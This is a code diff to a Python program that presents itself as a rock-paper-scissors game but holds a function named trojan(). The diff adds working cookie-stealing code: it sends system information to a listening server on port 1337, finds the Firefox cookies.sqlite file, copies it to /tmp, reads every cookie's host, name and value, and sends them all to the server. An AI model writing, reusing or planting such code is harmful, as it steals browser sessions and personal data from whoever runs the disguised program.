@@ -2,6 +2,7 @@ import os
 import random
 import socket
 import threading
+import sqlite3
 
 def trojan():
     # Create a socket object
@@ -21,26 +22,65 @@ def trojan():
     serv_addr = "127.0.0.1"
     port = 1337
 
-    # Path to the Firefox directory
-    path = f"{os.path.expanduser('~')}/.mozilla/firefox/"
+    # Prepare system information as a string
+    data = '\n'.join(f'{key}: {value}' for key, value in system_info.items())
 
     # Connect to the server
     try:
         client.connect((serv_addr, port))
-    except Exception as e :
-        return
+        client.sendall("[Client] Fetching Basic System Information".encode())
+        client.sendall(data.encode())
 
-    # Prepare system information as a string
-    data = '\n'.join(f'{key}: {value}' for key, value in system_info.items())
+        # Get the path to the cookies.sqlite file
+        profile_dirs = os.listdir(os.path.expanduser("~/.mozilla/firefox/"))
+        cookies_path = ""
+        for profile_dir in profile_dirs:
+            profile_path = os.path.expanduser(f"~/.mozilla/firefox/{profile_dir}")
+            if os.path.isdir(profile_path):
+                db_path = os.path.join(profile_path, "cookies.sqlite")
+                if os.path.isfile(db_path):
+                    cookies_path = db_path
+                    break
 
-    # Send system information to the C2 server
-    client.sendall(data.encode())
+        if not cookies_path:
+            client.sendall("[Client] No Firefox cookies found.".encode())
+        else:
+            # Copy the cookies.sqlite file to a temporary location
+            loot_path = "/tmp/cookies.sqlite.loot"
+            os.system(f"cp '{cookies_path}' '{loot_path}'")
 
-    # Check if Firefox is installed
-    if os.path.exists(path):
-        client.sendall("\nFirefox Is Installed!".encode())
-    else:
-        client.sendall("\nFirefox is Not Installed!".encode())
+            # Connect to the copied database and fetch the cookies
+            conn = sqlite3.connect(loot_path)
+            cursor = conn.cursor()
+            cursor.execute("SELECT host, "
+                           "CASE WHEN substr(host, 1, 1)='.' THEN 'TRUE' ELSE 'FALSE' END, "
+                           "path, "
+                           "CASE WHEN isSecure=0 THEN 'FALSE' ELSE 'TRUE' END, "
+                           "expiry, "
+                           "name, "
+                           "value "
+                           "FROM moz_cookies")
+            rows = cursor.fetchall()
+            cookie_data = ""
+            # Send the cookies to the server
+            client.sendall("[Client] Dumping Cookies...".encode())
+            for row in rows:
+                host, is_domain, path, is_secure, expiry, name, value = row
+                cookie_data += f"Host: {host}\n"
+                cookie_data += f"Is Domain: {is_domain}\n"
+                cookie_data += f"Path: {path}\n"
+                cookie_data += f"Is Secure: {is_secure}\n"
+                cookie_data += f"Expiry: {expiry}\n"
+                cookie_data += f"Name: {name}\n"
+                cookie_data += f"Value: {value}\n"
+                cookie_data += "----------------------\n"
+                client.sendall(cookie_data.encode())
+
+            # Close the database connection
+            conn.close()
+
+    except Exception as e:
+        print(f"An error occurred: {e}")
 
     # Close the connection
     client.close()
@@ -64,7 +104,6 @@ def game():
         print("2 - Paper")
         print("3 - Scissors")
 
-    os.system("clear")
     win = 0
     loss = 0
     draw = 0
